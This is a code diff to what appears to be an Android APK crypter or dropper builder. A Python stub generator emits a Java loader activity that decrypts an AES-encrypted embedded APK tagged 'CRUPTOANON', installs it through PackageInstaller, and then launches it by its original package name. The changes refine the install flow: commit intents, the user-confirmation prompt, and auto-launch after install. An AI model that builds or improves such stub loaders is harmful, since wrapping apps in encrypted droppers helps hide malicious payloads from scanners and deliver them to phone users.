@@ -623,6 +623,7 @@ class StubBuilder:
     def generate_loader_activity(self, aes_key_hex: str, apk_info: dict) -> str:
         output_apk_name = self._java_escape(apk_info["original_filename"])
         app_label = self._java_escape(apk_info["label"])
+        original_package = self._java_escape(apk_info["package"])
         payload_magic = "CRUPTOANON"
         payload_aad = "CRUPTOANON:v1"
         payload_version = 1
@@ -655,6 +656,7 @@ public class LoaderActivity extends Activity {{
     private static final byte[] PAYLOAD_AAD = "{payload_aad}".getBytes(StandardCharsets.US_ASCII);
     private static final String OUTPUT_APK_NAME = "{output_apk_name}";
     private static final String APP_LABEL = "{app_label}";
+    private static final String ORIGINAL_PACKAGE_NAME = "{original_package}";
     private File apkFile;
 
     @Override
@@ -662,8 +664,7 @@ public class LoaderActivity extends Activity {{
         super.onCreate(savedInstanceState);
 
         Intent launchIntent = getIntent();
-        if (launchIntent != null && "INSTALL_COMMIT".equals(launchIntent.getAction())) {{
-            finish();
+        if (handleInstallCommitIntent(launchIntent)) {{
             return;
         }}
 
@@ -679,6 +680,13 @@ public class LoaderActivity extends Activity {{
         }}
 
         startDecryption();
+    }}
+
+    @Override
+    protected void onNewIntent(Intent intent) {{
+        super.onNewIntent(intent);
+        setIntent(intent);
+        handleInstallCommitIntent(intent);
     }}
 
     @Override
@@ -778,6 +786,52 @@ public class LoaderActivity extends Activity {{
         errorDialog.show();
     }}
 
+    private boolean handleInstallCommitIntent(Intent intent) {{
+        if (intent == null || !"INSTALL_COMMIT".equals(intent.getAction())) {{
+            return false;
+        }}
+
+        int status = intent.getIntExtra(
+            PackageInstaller.EXTRA_STATUS,
+            PackageInstaller.STATUS_FAILURE
+        );
+
+        if (status == PackageInstaller.STATUS_PENDING_USER_ACTION) {{
+            Intent confirmIntent = (Intent) intent.getParcelableExtra(Intent.EXTRA_INTENT);
+            if (confirmIntent != null) {{
+                startActivity(confirmIntent);
+            }} else {{
+                showError("Система запросила подтверждение установки, но intent отсутствует.");
+            }}
+            return true;
+        }}
+
+        if (status == PackageInstaller.STATUS_SUCCESS) {{
+            launchInstalledApp();
+            return true;
+        }}
+
+        String statusMessage = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
+        if (statusMessage == null || statusMessage.trim().isEmpty()) {{
+            statusMessage = "PackageInstaller status=" + status;
+        }}
+
+        showError("Установка не удалась: " + statusMessage);
+        return true;
+    }}
+
+    private void launchInstalledApp() {{
+        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(ORIGINAL_PACKAGE_NAME);
+        if (launchIntent == null) {{
+            finish();
+            return;
+        }}
+
+        launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+        startActivity(launchIntent);
+        finish();
+    }}
+
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
         if (encrypted.length < PAYLOAD_MAGIC.length + 1 + 12 + 16) {{
             throw new IOException("Payload too short");
@@ -856,7 +910,6 @@ public class LoaderActivity extends Activity {{
 
             session.commit(pendingIntent.getIntentSender());
             session.close();
-            finish();
         }} catch (Exception e) {{
             if (session != null) {{
                 session.abandon();
